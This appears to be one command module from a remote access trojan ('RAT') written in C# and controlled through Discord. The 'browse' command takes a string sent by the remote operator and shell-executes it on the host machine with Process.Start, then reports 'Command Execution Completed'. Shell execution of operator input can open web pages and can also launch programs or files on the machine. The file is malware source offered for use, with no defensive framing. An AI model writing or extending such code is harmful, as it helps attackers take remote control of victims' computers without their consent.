using Discord.Commands;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace RAT.Commands
{
    public class BrowseCommand : ModuleBase<SocketCommandContext>
    {
        [Command("browse")]
        public async Task BrowseCmd(string url)

        {
            // Open the URL in the default browser
            Process.Start(new ProcessStartInfo(url) { UseShellExecute = true });
            await ReplyAsync("Command Execution Completed");
        }
    }
}

